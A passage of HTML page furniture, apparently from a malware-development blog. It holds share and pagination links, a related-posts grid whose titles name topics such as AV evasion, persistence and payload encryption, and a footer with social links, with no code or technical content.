+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fcocomelonc.github.io%2Fmalware%2F2022%2F07%2F30%2Fmalware-av-evasion-8.html" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/malware/2022/07/21/malware-tricks-22.html" class="pagination--pager" title="Malware development tricks. Run shellcode like a Lazarus Group. C++ example.
+">Previous</a>
+    
+    
+      <a href="/malware/2022/08/16/malware-av-evasion-9.html" class="pagination--pager" title="Malware AV evasion - part 9. Encrypt base64 encoded payload via RC4. C++ example.
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h2 class="page__related-title">You may also enjoy</h2>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/114/2023-12-26_23-10.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/malware/2023/12/25/malware-cryptography-23.html" rel="permalink">Malware and cryptography 23: encrypt/decrypt file via TEA. Simple C/C++ example.
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          6 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">﷽
+
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/113/2023-12-13_11-49.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/book/2023/12/13/malwild-book.html" rel="permalink">Malware in the wild book.
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          1 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">﷽
+
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/112/2023-12-11_01-01_1.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/persistence/2023/12/10/malware-pers-23.html" rel="permalink">Malware development: persistence - part 23. LNK files. Simple Powershell example.
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          3 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">﷽
+
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/111/2023-11-29_23-27.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/malware/2023/11/23/malware-cryptography-22.html" rel="permalink">Malware and cryptography 22: encrypt/decrypt payload via XTEA. Simple C++ example.
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          3 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">﷽
+
+</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+    </div>
+
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+          <li><a href="https://twitter.com/cocomelonckz" rel="nofollow noopener noreferrer"><i class="fab fa-twitter" aria-hidden="true"></i> Twitter</a></li>
+        
+      
+        
+          <li><a href="https://www.hackthebox.eu/profile/293150" rel="nofollow noopener noreferrer"><i class="far fa-flag" aria-hidden="true"></i> HackTheBox</a></li>
+        
+      
+        
+          <li><a href="https://tryhackme.com/p/cocomelonc" rel="nofollow noopener noreferrer"><i class="far fa-flag" aria-hidden="true"></i> TryHackMe</a></li>
+        
+      
+        
+          <li><a href="https://github.com/cocomelonc/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+        
+      
+        
+          <li><a href="https://www.linkedin.com/in/zhassulan-zhussupov-5a347419b/" rel="nofollow noopener noreferrer"><i class="fab fa-linkedin" aria-hidden="true"></i> LinkedIn</a></li>
+        
+      
+    
+
+    
+      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2023 cocomelonc. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+  </body>
+</html>
